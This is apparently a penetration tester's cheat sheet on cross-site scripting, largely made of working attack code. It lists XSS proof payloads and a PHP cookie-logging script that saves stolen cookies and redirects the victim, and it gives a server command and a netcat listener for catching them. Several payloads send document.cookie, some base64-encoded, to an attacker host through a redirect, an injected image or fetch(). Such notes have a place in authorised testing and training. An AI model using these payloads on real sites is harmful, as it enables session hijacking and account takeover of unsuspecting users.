# Cross-Site Scripting (XSS)
***
### In order to leverage a XSS attack to result in session cookie leakage the Session cookies should be:
* Carried in all HTTP requests
* Accessible by JavaScript code (Without the HTTPOnly attribute)

#### When working with input fields we should use payloads with event handlers such as `onload` or `onerror` as they prove the highest impact on stored XSS cases. When they are filtered the `onmouseover` may work.
```javascript
"><img src=x onerror=prompt(document.domain)>
```

#### `document.domain` is commonly used to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment.

#### More payloads that can be used in input fields
```javascript
"><img src=x onerror=confirm(1)>
```

```javascript
"><img src=x onerror=alert(1)>
```

#### Then before trying to obtain a session cookie through XSS we check if the HTTPOnly is off

### Obtaining session cookies through XSS
#### First we would need to create a cookie-logging script
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c00k1e"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.youtube.com/");
exit;
?>
```

#### Then run it
```bash
$ php -S <VPN/TUN IP>:8000
```

#### This would be our payload for the input field
```javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN IP>:8000/notMalware.php?c00k1e=' + document.cookie;"></video>
```

#### In a real world testing we could use [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/).

#### Example of a payload using HTTPS:
```javascript
<h1 onmouseover='document.write(`<img src="https://LINK?c00k1e=${btoa(document.cookie)}">`)'>test</h1>
```


### Obtaining session cookies via XSS using Netcat
#### Payload
```javascript
<h1 onmouseover='document.write(`<img src="http://<VPN/TUN IP>:8000?c00k1e=${btoa(document.cookie)}">`)'>test</h1>
```
#### Netcat 
```bash
$ nc -nlvp 8000
```
#### When using base64 encoding we can then decode the result directly in the Dev Console by using the `atob()` function.

#### Another interesting payload but without redirection
```javascript
<script>fetch(`http://<VPN/TUN IP>:8000?c00k1e=${btoa(document.cookie)}`)</script>
```

